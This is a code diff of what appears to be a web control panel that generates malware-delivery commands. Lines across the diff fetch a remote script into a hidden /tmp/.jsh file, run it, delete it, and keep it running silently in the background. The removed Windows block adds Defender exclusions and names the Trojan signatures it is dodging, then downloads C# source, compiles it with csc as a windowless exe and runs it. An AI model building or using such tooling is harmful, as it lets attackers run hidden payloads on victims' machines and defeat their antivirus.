@@ -244,6 +244,12 @@ curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_
 
 </main>
 <script>
+/* Windows 投递命令模板（服务端注入，含 __URL__ 占位符） */
+var WIN_DEPLOY = {{ win_deploy_ps|tojson }};
+var WIN_DEPLOY_BAT = {{ win_deploy_bat|tojson }};
+function escapeHtml(s){
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
 /* ── 代码块「复制」按钮 ──
    本面板多为 http（非安全上下文）→ navigator.clipboard 为 undefined，
    必须带 document.execCommand('copy') 回退，否则点击无反应。 */
@@ -491,7 +497,15 @@ function genPayload(){
          : '# Synology: 控制面板 > 终端机和SNMP > 启用 SSH';
        h+='<pre class="dt-code" style="margin:0"># NAS 一键部署（SSH 以 admin/root 登录后执行）\n'+sshhint+'\n\n# 方式1: wget\nwget -q '+u+' -O /tmp/.jsh && sh /tmp/.jsh; rm -f /tmp/.jsh\n\n# 方式2: curl\ncurl -sL '+u+' -o /tmp/.jsh && sh /tmp/.jsh; rm -f /tmp/.jsh\n\n# 方式3: 后台静默（断开 SSH 后继续）\nnohup sh -c "$(wget -qO- '+u+')" >/dev/null 2>&1 &</pre>';
     }else{
-      h+='<pre class="dt-code" style="margin:0">:: ★ 端点防护：Windows Defender 默认开启，会两步拦住投递\n::   ① 按【编译产物】判毒 Trojan:MSIL/Lazy.BAC!MTB —— 在【进程创建阶段】直接拦掉，\n::      报 \"file contains a virus\"，现象就是\"运行后直接退出、什么都没发生\"；\n::   ② 按【投递命令行】另有签名 Trojan:Win32/PowExcEnv.ZA!MTB —— 会把整条进程树清算。\n::   因此必须【先放行两个目标路径，再下载 → 编译 → 运行】。顺序反了（先编译后放行）\n::   没用：exe 一诞生就被实时扫描判定，事后放行救不回来。\n::\n:: 步1 放行（需管理员；非管理员会失败，只能先手动关实时保护）\npowershell -c \"Add-MpPreference -ExclusionPath ([IO.Path]::GetTempPath()+\'j.cs\'),([IO.Path]::GetTempPath()+\'j.exe\') -EA SilentlyContinue\"\n:: 步2 下载源码\npowershell -c \"IWR -Uri \''+location.origin+'/'+dl+'\' -OutFile ([IO.Path]::GetTempPath()+\'j.cs\') -UseBasicParsing\"\n:: 步3 编译（系统自带 csc.exe，无需 PATH）\n%WINDIR%\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /nologo /target:winexe /out:%TEMP%\\j.exe %TEMP%\\j.cs\n:: 步4 运行\n%TEMP%\\j.exe</pre>';
+      // Windows：PowerShell 原生命令（服务端模板 + __URL__ 替换）。
+      // 旧实现是 cmd 语法块，粘进 PowerShell 会因 ::/%TEMP%/%WINDIR% 失效而"无法运行"。
+      var wu=location.origin+dl;
+      var ps=WIN_DEPLOY.split('__URL__').join(wu);
+      var bt=WIN_DEPLOY_BAT.split('__URL__').join(wu);
+      h+='<div style="margin-bottom:10px"><b style="color:var(--accent2)"><i class="fas fa-terminal"></i> 方式1 · PowerShell（推荐，Win10/11 默认外壳）</b></div>';
+      h+='<pre class="dt-code" style="margin:0 0 14px 0">'+escapeHtml(ps)+'</pre>';
+      h+='<div style="margin-bottom:10px"><b style="color:var(--accent2)"><i class="fas fa-terminal"></i> 方式2 · cmd.exe（另存为 run.bat，管理员运行）</b></div>';
+      h+='<pre class="dt-code" style="margin:0">'+escapeHtml(bt)+'</pre>';
     }
     h+='</div></div>';
     res.innerHTML=h;
